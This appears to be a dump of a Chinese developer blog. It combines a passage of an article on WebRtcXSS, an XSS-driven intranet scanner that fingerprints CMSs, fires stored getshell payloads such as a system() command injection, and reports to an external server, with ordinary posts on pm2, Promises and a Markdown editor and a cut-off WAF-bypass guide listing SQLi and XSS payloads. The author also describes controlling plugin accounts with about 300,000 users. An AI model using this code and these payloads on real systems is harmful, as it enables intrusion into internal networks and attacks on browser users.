为什么是这个呢，很简单。我手里面没有Discuz的getshell漏洞。为了徒省事。就这样把。而favicon.ico文件我也很随意的使用了dedecms的favicon.ico。后面测试的时候，还望不要见怪。现在我们来运行下代码看下会发生什么事情吧： 我在/static/bbcode.js文件里写入的是console.log(1)所有会在控制台反馈1。这只是测试的代码，真实的环境是不会这样的。现在我们来看下DOM元素有些改变把： 已经调用了，程序检测到只有http://192.168.1.103/static/js/bbcode.js符合。那么一旦成功调用js文件，就会执行onlod里的vulnerabilityIpList(this)代码。而vulnerabilityIpList函数代码就在下一节。 0x06 检测内网主机中的漏洞是否真实存在（上篇）： 下面就是vulnerabilityIpList函数的代码：123456789101112131415161718192021222324function vulnerabilityIpList(info){ stage(3) ipAjax = new XMLHttpRequest(); ipAjax.onreadystatechange = function(){ if(ipAjax.readyState == 4 &amp;&amp; ipAjax.status == 200){ var vulCmsInfo = ipAjax.responseText; var img = document.createElement(\"img\"); img.setAttribute(\"scr\",vulCmsInfo); img.setAttribute(\"style\",\"display:none;\"); document.getElementsByTagName(\"body\")[0].appendChild(img); setTimeout(function(){ var scriptTag = document.createElement(\"script\"); scriptTag.setAttribute(\"src\",\"http://\"+info.getAttribute('data-ipadder')+\"/1.js\"); scriptTag.setAttribute(\"data-cmsinfo\",info.getAttribute(\"data-cmsinfo\")); scriptTag.setAttribute(\"data-vulip\",info.getAttribute('data-ipadder')); scriptTag.setAttribute(\"onload\",\"javascript:vulConfirm(this)\"); document.getElementsByTagName(\"body\")[0].appendChild(scriptTag); },2000); } } ipAjax.open('POST', snedIteratesCmsIpUrl, false); ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); ipAjax.send('existenceCmsIp='+ info.getAttribute(\"data-ipadder\") + '&amp;existenceCmsInfo=' + info.getAttribute(\"data-cmsinfo\") + '&amp;onlystring=' + onlyString);} 其中info参数是成功调用的script标签的DOM元素对象。首先让我们看下发送url的请求： existenceCmsIp参数是检测到cms类型的IP地址 existenceCmsInfo参数是检测到cms类型 onlystring参数是唯一标识符，用于服务器判断属于哪一个项目。 接下来让我们看下onreadystatechange里面的内容：12345678910111213var vulCmsInfo = ipAjax.responseText;var img = document.createElement(\"img\");img.setAttribute(\"scr\",vulCmsInfo);img.setAttribute(\"style\",\"display:none;\");document.getElementsByTagName(\"body\")[0].appendChild(img);setTimeout(function(){ var scriptTag = document.createElement(\"script\"); scriptTag.setAttribute(\"src\",\"http://\"+info.getAttribute('data-ipadder')+\"/1.js\"); scriptTag.setAttribute(\"data-cmsinfo\",info.getAttribute(\"data-cmsinfo\")); scriptTag.setAttribute(\"data-vulip\",info.getAttribute('data-ipadder')); scriptTag.setAttribute(\"onload\",\"javascript:vulConfirm(this)\"); document.getElementsByTagName(\"body\")[0].appendChild(scriptTag);},2000); 首先就是var vulCmsInfo = ipAjax.responseText;，把服务器返回的字符串赋值给vulCmsInfo变量。服务端的代码是：1234567891011121314151617181920212223/** 把客户端检测到存在CMS的IP加入到数据库中*/if(I('post.existenceCmsIp') == \"\" || I('post.existenceCmsInfo') == \"\" || I('post.onlystring') == \"\"){ $this-&gt;ajaxReturn(array( \"typeMsg\" =&gt; \"error\", ));}$existenceCmsIp = I('post.existenceCmsIp');$existenceCmsInfo = I('post.existenceCmsInfo');$onlyString = I('post.onlystring');$existencecmsip = M('existencecmsip');$existenceData['inner_ip'] = $existenceCmsIp;$existenceData['cms'] = $existenceCmsInfo;$existenceData['onlystring'] = $onlyString;$existenceData['create_time'] = date('Y-m-d H:i:s');$existencecmsip-&gt;data($existenceData)-&gt;add();/** 获取数据库中的cms漏洞详情，发送给客户端*/$cmsvul = M('cmsvul');$vulInfo = base64_decode($cmsvul-&gt;where('cms=\"'.$existenceCmsInfo.'\"')-&gt;getField(\"vulinfo\"));echo \"http://\".$existenceCmsIp.$vulInfo;从代码中可以看到服务端返回的不是json数据，而是字符串，这个字符串是拼接好的url。这个url就是从获取到的IP地址加上服务器中调用属于cms漏洞的path路径。 然后使用img标签来发送get请求，用于触发此getshell漏洞。代码也就是：1234var img = document.createElement(\"img\");img.setAttribute(\"scr\",vulCmsInfo);img.setAttribute(\"style\",\"display:none;\");document.getElementsByTagName(\"body\")[0].appendChild(img); 至于为什么要使用setTimeout函数来延迟2秒钟执行，是因为之前也说过浏览器是无法同时判断那么多的img请求。因为这里只有一个所以我使用了2秒，真实情况下可以改为20秒。然后建立一个script标签，用于判断1.js是否生成成功，如果生成成功，就说明漏洞存在，交给下一个函数处理，如果不存在，就此打住。因为onload不会调用vulConfirm函数。至于为什么要判断1.js文件，就是我之前所说的getshell生成的代码。在数据中是这样的： 是一段base64密文，解开后，内容如下：/vul/heihei.php?a=system('echo 1 &gt;&gt; ../1.js');而在后端发送给前端的时候，我已经解密了。如同上面代码中：$vulInfo = base64_decode($cmsvul-&gt;where('cms=&quot;'.$existenceCmsInfo.'&quot;')-&gt;getField(&quot;vulinfo&quot;));而在浏览器中代码是这样： 接下来就是setTimeout函数的真正的用处了。请注意这段代码：scriptTag.setAttribute(&quot;src&quot;,&quot;http://&quot;+info.getAttribute('data-ipadder')+&quot;/1.js&quot;);在script中把src的赋值成检测目标站点是否存在1.js。如果存在就运行onload里的vulConfirm函数。而vulConfirm函数就在下一节。 0x07 检测内网主机中的漏洞是否真实存在（下篇）： vulConfirm函数的内容很简单，只有给服务端发送的代码。1234567function vulConfirm(cmsConfirmInfo){ stage(4) ipAjax = new XMLHttpRequest(); ipAjax.open('POST', sendExistenceVul, false); ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); ipAjax.send('cms='+ cmsConfirmInfo.getAttribute(\"data-cmsinfo\") + '&amp;vulip='+ cmsConfirmInfo.getAttribute(\"data-vulip\") +'&amp;onlystring=' + onlyString);} cms参数是存在漏洞的CMS信息 vulip是存在漏洞的IP地址 onlystring是唯一标识符，用于服务端判断 0x08 stage的作用： stage函数代码如下：123456function stage(num){ var updataStage = document.createElement(\"img\"); updataStage.setAttribute(\"src\",\"http://webrtcxss.cn/Api/stage/onlystring/\"+onlyString+\"/updata/\"+num); updataStage.setAttribute(\"style\",\"display:none;\"); document.getElementsByTagName(\"body\")[0].appendChild(updataStage);} 就是一个img标签，发送get请求到服务端，告诉服务端代码运行到哪里了。在平台中的反馈如图： 0x09 API后端代码： 后端使用了thinkphp框架。如果你想修改服务端接受的方式的话。请在/Application/Home/Controller目录下修改ApiController.class.php文件，就行了。里面的内容分为survivalIp、survivalPortIp、_empty、survivalCmsIp、existenceVul、stage模块。可根据JavaScript中的代码来做出相应的修改。如图： 0x10平台专属的API： 平台的api在/Application/Home/Controller目录下的RootApiController.class.php文件里。建立项目、删除项目、查询项目都在里面。如果你想修改JavaScript代码，就在建立项目中修改，如图： 修改起来很简单。平台运行起来如下图： 0x11数据库的结构： 一共具有7个表，如下： webrtc_cmspath用于存放检测cms类型的JavaScript路径 webrtc_cmsvul用于存放cms的getshell漏洞详情 webrtc_existencecmsip用于存放内网中哪些IP具有cms webrtc_existencevul用于存放内网中哪些IP具有的CMS有漏洞 webrtc_ipdatalist用于存放内网中所有开放80端口切具有站点的ip列表 webrtc_project用于存放项目信息 webrtc_survivaliplist用于存放当前主机的内网ip 0x12特殊的玩法： 之前在freebuf说过了，地址是：http://www.freebuf.com/articles/web/61268.html因为nginx或者apache有些管理员会使用日志看实时查看网站的流量，由于log日志看起来太丑，于是就有人想出web端实时的反馈网站流量。但是在记录user-agent等数据包格式的时候，没有做好过滤。从而导致攻击者修改自己的user-agent为XSS攻击字符串，再进行浏览网站的操作，网站管理员在查看的时候就会触发XSS，如果配合本章所讲的内容。就像下雨天吃着巧克力一样完美。其实并不一定非要是nginx或者apache，有些网站的后台写的程序中会使用后端语言而非nginx这种配置生成文件，他们会直接记录下你们的IP、user-agent。从而在后台方便查看。这个时候我们本章所说的内容就会排上用场。关于插件安全的话，请大家看下面这张图： 我控制了十多个maxthon插件作者的账户，现在具有30w的插件用户，而我可以随时随地的更改其中的代码，而我问了一下maxthon插件的官方人员，答复是： 即使你没有相关的插件作者用户。可以使用组简单的html+swf来写一个插件小游戏，一个星期就可以上千。这里我打个比方，10w用户都安装了我的插件。其中5w是已经工作的用户。2w是在公司电脑上使用maxthon并安装了插件，一旦打开maxthon浏览器，插件就会自动运行。而当插件发现有新版本时，会自动静默安装。然后就会运行我们的JavaScript代码，而我在0x03节的地方说到maxthon也是支持WebRTC的，但是这里会有坑。我不清楚是不是由版本引起的问题，在chrome下运行WebRTC代码时会显示一组IP，也是当前电脑的内网IP，而在maxthon下，会出现三组，可能不止三组。如图： 其中192.168.27.1是我电脑上的VM虚拟机的IP段。192.168.118.1也是VM虚拟机上的ip段。只有192.168.1.104才是当前真正的内网IP。所以在源程序里会出现join函数和对ipList变量的for循环。 0x13失败的思路： 思路一、 假设这里获取到的内网IP为192.168.21.104。根据for循环输出img、script标签可以获取到内网的所以存活IP地址（也可以探测port），但是这里有一个问题，就是JavaScript里怎么获取到其他内网的资源信息，因为跨域，ajax、iframe都不行。我昨天晚上问了0xJin，他是没有获取，只是扫的存活IP及端口。但是说好是内网漫游，不能只获取到当前触发XSS的Pc。昨天晚上查了一夜的资料，有个思路，但是不知道能不能实现。这里说明一下，如果有什么好的建议可以提出来。当然思路可能错误。 前面的跳过，假设现在已经有了内网中开放80端口的IP。既然ajax、iframe都不行，那我们可以尝试一下flash来获取，但是flash也有相应的crossdomain.xml限制，但是今天上午查资料的时候找到了这么一篇文章：http://www.litefeel.com/cross-flash-security-sandbox-get-visual-data根据作者所说，这个方法只能获取到视觉对象（图片、swf），也就是说无法获取存活IP里的html源码了。 我想是否可以使用flash发送一个带有XSS的URL（内网IP）XSS里调用Html2canvas插件来把存活IP中的网站截图发送给我们的服务器端。当然了，这里有一个限制条件，就是必须获取存活IP中网站的cms信息（可以使用&lt;img src=&quot;内网IP/favicon.ico&quot;&gt;再把图片发送给远程服务器，来接受。这样就可以判断属于哪个cms类型的了，构架代码的时候可以加一个定时获取远程服务器的JavaScript代码，这样我们看到是cms类型后，就可以在网上找相应的爆版本信息的方法，写成代码，等待客服端的定时任务获取到）。 现在信息有了，还有一个条件，就是XSS漏洞，需要XSS漏洞来加载Html2canvas插件，并且保存成图片发送给远程的服务器。 问题来了，反射XSS并不是正真的打开网站，而是发送get请求。那canvas并不会加载，也就说图片获取失败。储蓄型的话可能成功。 失败的原因： canvas无法获取到iframe里的DOM内容 img无法发送到远程服务器，因为调用img图片的时候，当前页面和img的图片不是同源的，无法发送 隐蔽性很差 思路二、 之前我提到的思路是使用xss+iframe+canvas，但是@超威蓝猫 说到canvas无法截取到iframe里的内容，后来我上网查后，确实如此（基础不牢的结果）。后来我又有了一个新的思路，使用&lt;img src=&quot;https://xxx.xxx.xxx.xxx/favico.ico&quot; /&gt;来获取网站的cms信息，因为不同的cms他们的ico图标也是不一样的，把img发送到服务器端后，就可以识别网站属于哪种cms类型了。但是后来和伟哥 @呆子不开口 讨论了几个小时，发现忽略了一个重要的问题，怎么把img发送到远程服务器，img图片地址不是同源的，而且怎么把图片使用JavaScript转成二进制数据。这个思路又断了。伟哥提到一个很nice的解决方案，检测js脚本，也就是&lt;script src=&quot;http://xxx.xxx.xxx.xxx/path/cms.js&quot; onload=&quot;xxx(this)&quot;&gt;&lt;/script&gt;这样的话，我就需要大量cms独立的js文件位置。工作量大。我本来都打算使用这个了，但是前几天闲的无聊翻自己的QQ日志时，发现了一段代码：123document.addEventListener(\"visibilitychange\", function() { document.title = document.hidden ? 'iloveyou' : 'metoo';}); 这是HTML5推出的API，我发现我可以利用这个API来达到神不知鬼不觉的上传图片。首先当用户切换到其他浏览器标签的时候，document.hidden会为true。那么我们就可以确定用户没有访问我们XSS的网页。那么我们干什么用户都不会发现了。大致的思路如下：1234567891011document.addEventListener(\"visibilitychange\", function() { if(document.hidden){ var htmlText = $(\"body\").html(); $(\"body\").empty(); $(\"body\").append(\"&lt;img src='http://xxx.xxx.xxx.xxx/favico.ico' /&gt;\"); //canvas获取页面，请移步：http://leobluewing.iteye.com/blog/2020145 }else{ $(\"body\").empty(); $(\"body\").append(htmlText); }}); 失败的原因： 因为之前提到过img加载太消耗时间，尤其在maxthon浏览器下，三组以上的IP地址全部检测完成需要30分钟左右。如果用此方法的话，需要确保用户在半个小时内不能打开此页面 canvas无法获得不是本源的图片，也就是说不能获取到img加载的图片 总结后，就采用了伟哥的方法。 0x14结尾： 在此尤其感谢，@呆子不开口 。这篇文章写的很累，因为img标签发送的耗时长的问题，导致每一次修改BUG的时候，都需要等9-10分钟。也是我目前为止写的时间最长的一篇文章。因为要学驾照，时间更少了。大概花了一个月左右的时间。之前和主编约稿的日期是15日，一直拖到现在，挺对不住的。前端、后端、数据库还有些的BUG没有修复，如果此平台的安装量达到1000会继续更新，下面是平台下载的url：https://github.com/BlackHole1/WebRtcXSS 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","link":"/2016/12/14/browser-plugin-attack-vector/"},{"title":"基于Vue+Koa的pm2配置","text":"背景介绍目前使用的技术栈是：前端Vue、后端Koa、数据库Mongodb。 然而每当起服务的时候，都要npm start、node ./server/app.js，还要同时保持这两个窗口一直是开着的，很是麻烦。 而且因为我使用的是koa，也没有使用狼叔写的koa脚手架。是自己基于廖雪峰老师的Koa框架 改的一个小型mvc。导致没有热更新。 为了简化这种没必要的操作及增加热更新，开始想怎么进行优化。于是选择了pm2 配置pm2先安装pm2：npm i pm2、npm i pm2 -g因为是开源项目，为了让代码能再别人的电脑上跑起来，需要让pm2存在项目里。然后在全局安装，方便后期调试 再项目的根目录里创建logs目录 在当前的目录创建一个pm2.json的文件，内容如下：1234567891011121314151617181920212223242526272829303132{ \"apps\": [{ \"name\": \"koler-server\", \"script\": \"./app.js\", \"error_file\" : \"../logs/server-err.log\", \"out_file\" : \"../logs/server-out.log\", \"merge_logs\" : true, \"log_date_format\" : \"YYYY-MM-DD HH:mm Z\", \"cwd\": \"./server\", \"watch\": [ \"app.js\", \"controllers\" ], \"watch_options\": { \"followSymlinks\": false } },{ \"name\": \"koler-app\", \"script\": \"./build/dev-server.js\", \"error_file\" : \"./logs/app-err.log\", \"out_file\" : \"./logs/app-out.log\", \"merge_logs\" : true, \"log_date_format\" : \"YYYY-MM-DD HH:mm Z\", \"cwd\": \"./\", \"ignore_watch\" : [ \"node_modules\" ], \"watch_options\": { \"followSymlinks\": false } }]} 这里同时启动两个项目。koler-server是koa，koler-app是前端vue。 我尝试了一下把1234\"error_file\" : \"./logs/app-err.log\",\"out_file\" : \"./logs/app-out.log\",\"merge_logs\" : true,\"log_date_format\" : \"YYYY-MM-DD HH:mm Z\", 代码提升到json的根部，但是发现不起作用。看来pm2不支持这种。所以只能在每个服务里写了。 配置package.json替换之前的script字段下的dev，然后再增加stop字段，替换后如下： 1234567\"scripts\": { \"dev\": \"pm2 start pm2.json &amp;&amp; pm2 logs\", \"start\": \"npm run dev\", \"stop\": \"pm2 stop koler-app koler-server &amp;&amp; pm2 delete koler-app koler-server\", \"build\": \"node build/build.js\", \"lint\": \"eslint --ext .js,.vue src\"}, pm2 start pm2.json &amp;&amp; pm2 logs是基于pm2.json文件配置启动，后面的pm2 logs是为了同时跟踪vue和koa的反馈日志。 输入npm start后。终端如下： 那个错误是不用管的，因为我忘记清理之前的日志了 启动后，你的屏幕会出现一个cmd窗口，不用关，过一会它会自行关闭的。每次修改代码触发pm2配置文件里watch规则时，就会自动弹出一个cmd窗口，也是过一会关闭。 因为其他项目使用者可能会在电脑上跑多个pm2实例，所以在stop字段里，我跟上了名字。防止出现把所有的实例全部暂定删除了。 测试现在我们更改代码发现没有任何问题，pm2会帮助我们自动进行热更新。现在我们故意改错一段vue的代码试试： 可以发现已经OK了。 这里说明一下为什么在pm2.json配置文件里的第二个实例koler-app没有watch，因为vue在开发环境下使用的是wenpack的watch，所以不需要加。 Author：Black-HoleEmail：158blackhole@gmail.comBlog：http://bugs.ccWeiBo：http://weibo.com/comeloveTwitter：https://twitter.com/Free_BlackHole","link":"/2017/11/07/Koa-pm2-configuration/"},{"title":"对Promise增加统一操作扩展","text":"前言在ES6里，增加了Promise方法。而Promise的回调函数只有then和catch两种方法。 而后，Promise又添加了两种附加方法，当然需要自己去添加进去。 一个是done方法: http://es6.ruanyifeng.com/#docs/promise#done 一个是finally方法：http://es6.ruanyifeng.com/#docs/promise#finally 可以去看一下上文的链接去了解一下，或者去下面的链接，看下官方源码是如何实现的: done 和 finally 正文但是却没有一个针对then和catch的统一操作。 如果在最后处理的时候，then和catch的代码处理逻辑差不多的情况下，可能就需要写两份差不多的代码量。 当然可能会有些人会把差不多的代码处理逻辑提取到一个函数里，但是这样也不太美观，这个时候如果有一个回调函数可以同时处理resolve和reject就好了。 我们可以对Promise方法添加一个原型函数。这个函数来捕获resolve和reject，然后进行处理返回，就好了。代码很简单，如下： 123456Promise.prototype.unified = function (callback) { this.then( data =&gt; callback(true, data), data =&gt; callback(false, data) )} 使用的方法也很简单，我们先写一个没有统一操作的Promise代码： 1234567891011121314151617181920212223let promise = new Promise(function(resolve, reject) { if (false){ setTimeout(() =&gt; resolve('success'), 1000) } else { setTimeout(() =&gt; reject('error'), 1000) }})promise .then((data) =&gt; { console.log( state: true, data: data, msg: 'operation successful' ) }) .catch((data) =&gt; { console.log( state: false, data: data, msg: 'operation failed' ) }) 然后我们使用unified方法重写一个： 12345678910111213141516let promise = new Promise(function(resolve, reject) { if (false){ setTimeout(() =&gt; resolve('success'), 1000) } else { setTimeout(() =&gt; reject('error'), 1000) }})promise.unified((state, data) =&gt; { const msg = state ? 'operation successful' : 'operation failed' console.log( state, data, msg )}) 是不是方法了很多，当然此方法属于代码耦合了。也请谨慎使用，不然后期维护会很麻烦。","link":"/2018/01/06/add-unified-operation-extensions-to-promise/"},{"title":"基于vue-simplemde实现图片拖拽、粘贴功能的一些思考","text":"前言项目使用的是vue框架，需要一个markdown的编辑框，就在npm上找了一下，发现simplemde挺不错的，由于我比较懒，就顺便在npm又搜了一下，找到了vue-simplemde这个package，那就开始使用它吧。 但是这个vue-simplemde不支持图片拖拽上传、粘贴上传，也不能说是因为这个vue-simplemde，因为vue-simplemde只是对simplemde的基础上封装成一个Vue插件。所以最后还是由于simplemde没有提供相关的功能，但是为了用户体验考虑，这个功能时必要的，除非不使用markdown编辑器。而去使用富文本编辑器，那样的话，项目很多的代码都要进行更改。所以就在网上查了文章，及在github上查了一些代码。下面将进行分析 拖拽拖拽的API核心是drop这个事件，就是当我们从桌面拖动一个文件到浏览器里时，松开的时候，而触发的事件名。 我们都知道，你随便拖动一个图片到浏览器里，会直接打开这个图片，这是因为浏览器默认你拖动文件到浏览器里时，将打开这个文件，所以，我们需要阻止原生的操作。 我们现在先写一段代码，让其屏蔽掉默认事件 123456window.addEventListener(\"drop\", e =&gt; { e = e || event if (e.target.className === 'CodeMirror-scroll') { // 如果进入到编辑器的话，将阻止默认事件 e.preventDefault() }}, false) CodeMirror-scroll这个Class就是simplemde编辑框的Class名称。 现在我们拖拽文件到这个编辑框，然后松掉，不会出现任何反应。如果在编辑框之外的地方，还是会继续触发默认事件。 下面就是获取simplemde方法，给他drop事件处理方法。 123456789101112131415161718192021222324252627282930// 假设页面一共有三个编辑窗口，所以需要循环监听事件[ this.$refs.simplemde1, this.$refs.simplemde2, this.$refs.simplemde3].map(({simplemde}) =&gt; { simplemde.codemirror.on('drop', (editor, e) =&gt; { if (!(e.dataTransfer &amp;&amp; e.dataTransfer.files)) { // 弹窗说明，此浏览器不支持此操作 return } let dataList = e.dataTransfer.files let imageFiles = [] // 要上传的文件实例数组 // 循环，是因为可能会同时拖动几个图片文件 for (let i = 0; i &lt; dataList.length; i++) { // 如果不是图片，则弹窗警告 仅支持拖拽图片文件 if (dataList[i].type.indexOf('image') === -1) { // 下面的continue，作用是，如果用户同时拖动2个图片和一个文档，那么文档不给于上传，图片照常上传。 continue } imageFiles.push(dataList[i]) // 先把当前的文件push进数组里，等for循环结束之后，统一上传。 } // uploadImagesFile方法是上传图片的方法 // simplemde.codemirror的作用是用于区分当前的图片上传是处于哪个编辑框 this.uploadImagesFile(simplemde.codemirror, imageFiles) // 因为已经有了下面这段代码，所以上面的屏蔽默认事件代码就不用写了 e.preventDefault() })}) 诈一看，代码好像有点多，那是因为注释的原因，下面是没有注释的代码。你可以根据下面的代码，有自己的见解和理解： 1234567891011121314151617181920[ this.$refs.simplemde1, this.$refs.simplemde2, this.$refs.simplemde3].map(({simplemde}) =&gt; { simplemde.codemirror.on('drop', (editor, e) =&gt; { if (!(e.dataTransfer &amp;&amp; e.dataTransfer.files)) { return } let dataList = e.dataTransfer.files let imageFiles = [] for (let i = 0; i &lt; dataList.length; i++) { if (dataList[i].type.indexOf('image') === -1) { continue } imageFiles.push(dataList[i]) } this.uploadImagesFile(simplemde.codemirror, imageFiles) e.preventDefault() })}) 粘贴粘贴的API是paste方法，这个不像上面一样，粘贴不需要禁止默认事件，因为我们可以看到，你复制一个图片，到浏览器里按下ctrl+v的时候，是不会发生任何变化的，所以没用必要禁止默认事件。 下面是代码: 1234567891011121314simplemde.codemirror.on('paste', (editor, e) =&gt; { // 粘贴图片的触发函数 if (!(e.clipboardData &amp;&amp; e.clipboardData.items)) { // 弹窗说明，此浏览器不支持此操作 return } try { let dataList = e.clipboardData.items if (dataList[0].kind === 'file' &amp;&amp; dataList[0].getAsFile().type.indexOf('image') !== -1) { this.uploadImagesFile(simplemde.codemirror, [dataList[0].getAsFile()]) } } catch (e) { // 弹窗说明，只能粘贴图片 }}) 之所以这里写上try...catch方法，是因为如果你粘贴的时候，如果是一个文件，items将是空的，而在下面的if循环里，使用dataList[0].kind。也就是e.clipboardData.items[0].kind。当item为空时，还去访问一个不存的kind属性时，就会报错了。所以这里需要使用try...catch方法进行判断。 dataList[0].getAsFile().type.indexOf('image') !== -1这个句话是判断，粘贴的东西确认是图片，而不是其他东西。 if里的上传图片，不一样的地方是[dataList[0].getAsFile()]，因为为了统一格式，方便uploadImagesFile函数进行处理，我加上了[]，使之成为数组。dataList[0].getAsFile()就是获取文件实例了。 上传上传就有一点麻烦了： 12345678910111213141516171819202122232425262728293031323334353637uploadImagesFile (simplemde, files) { // 把每个文件实例使用FormData进行包装一下，然后返回一个数组 let params = files.map(file =&gt; { let param = new FormData() param.append('file', file, file.name) return param }) let makeRequest = params =&gt; { return this.$http.post('/Api/upload', params) } let requests = params.map(makeRequest) this.$http.spread = callback =&gt; { return arr =&gt; { return callback.apply(null, arr) } } // 服务端返回的格式是{state: Boolean, data: String} // state为false时，data就是返回的错误信息 // state为true时，data是图片上传后url地址，这个地址是针对网站的绝对路径。如下： // /static/upload/2cfd6a50-3d30-11e8-b351-0d25ce9162a3.png Promise.all(requests) .then(this.$http.spread((...resps) =&gt; { for (let i = 0; i &lt; resps.length; i++) { let {state, data} = resps[i].data if (!state) { // 弹窗显示data的错误信息 continue } let url = `![](${location.origin + data})` // 拼接成markdown语法 let content = simplemde.getValue() simplemde.setValue(content + url + '\\n') // 和编辑框之前的内容进行拼接 } }))} 因为我是把axiox封装成vue插件来使用，这样会导致，this.$http是实例化后的，而不是他本身。axios维护者说的解决方案是，重新引入axios包，来使用。但是我觉得没有必要。axios.all内部是Promise.all。axios.spread实现代码比较少，就直接拿过来，重新赋值给axios就好了 所以上面有段代码是1234Promise.all(requests) .then(this.$http.spread((...resps) =&gt; { // code }) 把这段代码翻译一下就是 1234axios.all(requests) .then(axios.spread((...resps) =&gt; { // code }) 关于这个问题，请看下官方的解释：axios-all-is-not-a-function-inside-vue-component。也可以看下axios的代码：axios.js#L45-L48 这个问题，暂时就不深究了，我们回到刚刚的话题上。 上面我说到当state为true时，data是文件相对于网站的绝对路径，如: /static/upload/2cfd6a50-3d30-11e8-b351-0d25ce9162a3.png 如果我们需要进行拼接一下，所以就有了![](${location.origin + data})这段代码进行拼接。最后的两行是获取指的获取之前的内容，然后在追加url地址。 结尾下面是最终的效果图: 完整代码：Subject.vue#L378-L465 参考 &amp;&amp; 感谢skecozo作者的laravel-demo项目里的部分代码 Lemon作者的《simplemde 实现拖拽、粘贴图片上传》文章 f-loat作者的vue-simplemde项目 wescossick作者的simplemde项目 作者信息： Author: Black-Hole Blog: http://bugs.cc/ github: https://github.com/BlackHole1/ Twitter: https://twitter.com/Free_BlackHole Email: 158blackhole@gmail.com","link":"/2018/04/12/simplemde-realizes-some-thoughts-on-drag-and-drop-and-paste-function/"},{"title":"杂谈如何绕过WAF（Web应用防火墙）","text":"0×01 前言： 这个议题呢，主要是教大家一个思路，而不是把现成准备好的代码放给大家。 可能在大家眼中WAF（Web应用防火墙）就是“不要脸”的代名词。如果没有他，我们的“世界”可能会更加美好。但是事与愿违。没有它，你让各大网站怎么活。但是呢，我是站在你们的这一边的，所以，今天我们就来谈谈如何绕过WAF吧。之所以叫做“杂谈”，是因为我在本次演讲里，会涉及到webkit、nginx&amp;apache等。下面正式开始：） 0x02 直视WAF： 作为第一节，我先为大家简单的说下一些绕过WAF的方法。 1、 大小写转换法：看字面就知道是什么意思了，就是把大写的小写，小写的大写。比如:12SQL：sEleCt vERsIoN();‍‍XSS：&lt;sCrIpt&gt;alert(1)&lt;/script&gt; 出现原因：在waf里，使用的正则不完善或者是没有用大小写转换函数 2、 干扰字符污染法:空字符、空格、TAB换行、注释、特殊的函数等等都可以。比如下面的：123SQL：sEleCt+1-1+vERsIoN /*!*/ ();`yohehe‍‍‍‍SQL2：select/*!*/`version`();XSS：下面一节会仔细的介绍 3、字符编码法：就是对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、base64等，XSS编码有：HTML、URL、ASCII、JS编码、base64等等12SQL:load_file(0x633A2F77696E646F77732F6D792E696E69)‍‍‍‍XSS：&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt; 出现原因：利用浏览器上的进制转换或者语言编码规则来绕过waf 4、拼凑法如果过滤了某些字符串，我们可以在他们两边加上“原有字符串”的一部分。12SQL：selselectect verversionsion();‍‍‍‍XSS：&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt; 出现原因：利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。 本节是告诉大家，waf总会有自己缺陷的，任何事物都不可能完美。 0x03 站在webkit角度来说绕过WAF： 可能这时会有人问到，说绕过WAF，怎么跑到webkit上去了。嗯，你没有看错，我也没有疯。之说以站在webkit角度来讲绕过WAF，是因为各个代码的功能是由浏览器来解析的。那浏览器中谁又负责解析呢？那就是webkit， 既然要说到webkit，那就不得不提webkit下的解析器——词法分析器，因为我们在绕过的时候，就是利用解析器中的词法分析器来完成。 就比如一个简单的绕过WAF的XSS代码： &lt;iframe src=&quot;java script:alert(1)&quot; height=0 width=0 /&gt;&lt;iframe&gt; &lt;!--Java和script是回车，al和ert是Tab换行符--&gt;他可以弹窗，可以为什么他可以弹窗呢？这里面有回车、换行符啊。想要理解，我们来看看webkit下的Source/javascriptcore/parser/lexer.cpp是怎么声明的吧。123456789101112while (m_current != stringQuoteCharacter) { if (UNLIKELY(m_current =='\\\\')) { if (stringStart != currentSourcePtr() &amp;&amp; shouldBuildStrings) append8(stringStart, currentSourcePtr() - stringStart); shift(); LChar escape = singleEscape(m_current); if (escape) { if (shouldBuildStrings) record8(escape); shift(); } else if (UNLIKELY(isLineTerminator(m_current))) shiftLineTerminator(); 注意倒数第二行里的isLineTerminator函数。这里我来说说大致的意思：所有的内容都在一个字符串里，用while逐字解析，遇到换行就跳过。然后在拼成一个没有分割符的字符串，所以这时的XSS代码成功弹窗了。Webkit里的词法分析器里除了跳过换行符，还会跳过什么字符呢？ 子曰：还有回车等分隔符。 根据webkit词法分析器的机制，我们就可以写更多的猥琐xss代码。 下面再说说这个注意事项： 1234&lt;iframe src=\"javascript:alert(1)\" height=0 width=0 /&gt;&lt;iframe&gt; &lt;!--这个可以弹窗--&gt;&lt;iframe src=javascript:alert(1); height=0 width=0 /&gt;&lt;iframe&gt; &lt;!--这个不可以弹窗--&gt; 因为在webkit的词法分析器里，跳过回车、换行等分隔符时有个前提，那就是必须用单/双引号围住，不然不会跳过。因为如果不使用引号，词法分析器会认为 回车、换行就是结束了，如果你运行上面这段代码，webkit会把java当做地址传给src。词法分析器跳过的前提就是建立在引号里的，切记。这里在说一个： 回车、换行只在属性中引号里才会起作用。如果你对标签或者属性用 回车、换行，这时你大可放心，决对不会弹窗。而且在属性值里 回车、换行随便用。如果空格出现在xss代码里并不会弹窗，但是如果出现在字符和符号之前，就可以弹了。如图： 注意事项：跳过回车和换行，不支持on事件。例如下面的代码&lt;a href=&quot;java script:alert(1)&quot;&gt;xss&lt;/a&gt;会弹窗，但是下面的代码就不行了。 &lt;a href=&quot;#&quot; onclick=&quot;aler t(1)&quot;&gt;s&lt;/a&gt;可见加了Tab换行，就无法弹窗了。但是还是支持字符和符号之间加入空格的。本节就是告诉大家，想要玩的更好，最好追溯到底层，从底层来看攻击手法，你会发现很多问题迎刃而解。 0x04 利用Nginx&amp;Apache环境 BUG来绕过waf： 这个bug比较鸡肋，需要在nginx&amp;apache环境，而且管理员较大意。这是一个不是bug的bug。当网站采用前端Nginx，后端Apache时，需要在conf配置，当遇到PHP后缀的时候，把请求交给Apache处理。但是Nginx判断后缀是否为PHP的原理是根据URL的。也就是说如果当URL的后缀不是PHP的时候，他并不会把PHP教给Apache处理。配置: 乍一看，没什么问题。但是这里隐藏一个漏洞。 我在test目录建立一个index.php： 